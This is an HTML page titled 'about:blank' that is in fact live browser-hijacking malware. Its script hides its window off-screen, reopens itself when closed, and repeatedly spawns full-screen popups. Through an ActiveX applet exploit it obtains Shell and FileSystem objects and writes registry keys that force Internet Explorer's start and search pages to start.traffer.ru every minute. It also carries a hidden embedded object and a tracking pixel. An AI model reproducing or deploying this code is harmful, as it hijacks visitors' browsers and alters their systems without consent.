<head>
<script>
oufok=0
rto=null
topn=0
function ouf()
{
if (oufok==1) { return }
oufok=1
wpo=window.open(self.location.href,"sys","top=3000,left=3000,fullscreen")
rt()
shp()
}
function rt()
{
clearTimeout(rto)
if (typeof(wto)!="undefined") { wto.close() }
if (topn==6) { oufok=1; setTimeout("self.close()",1000); return }
topn++
wto=window.open("top.php","","fullscreen")
setTimeout("wto.focus()",5000)
setTimeout("wto.focus()",10000)
setTimeout("wto.focus()",15000)
rto=setTimeout("rt()",35000)
}
function sw()
{
self.blur()
self.moveTo(3000,3000)
self.resizeTo(200,200)
}
function shp()
{
 try
 {
  a1=document.applets[0]
  a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")
  a1.createInstance()
  Shl=a1.GetObject()
  a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}")
  a1.createInstance()
  FSO=a1.GetObject()
  a1.setCLSID("{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}")
  a1.createInstance()
  Net=a1.GetObject()
  try
  {
   HPUrl="http://start.traffer.ru"
   Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page",HPUrl)
   Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Page_URL",HPUrl)
   Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page",HPUrl)
   Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Search_URL",HPUrl)
  }
  catch(e){}
 }
 catch(e){}
}
sw()
if (typeof(self.name)!="undefined" && self.name=="sys")
{
rto=setTimeout("rt()",35000)
}
else { rt() }
setInterval('shp()',60000)
</script>
<title>about:blank</title>
</head>

<body onbeforeunload=ouf() onunload=ouf() onfocus=sw();rt()>    

<img src=http://u4191.94.spylog.com/cnt?cid=419194&rn=767114 width=1 height=1>

<div style='display: none;'><object width=1 height=1 type=text/html data=open_dolls2.htm></object></div>
<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>

</body>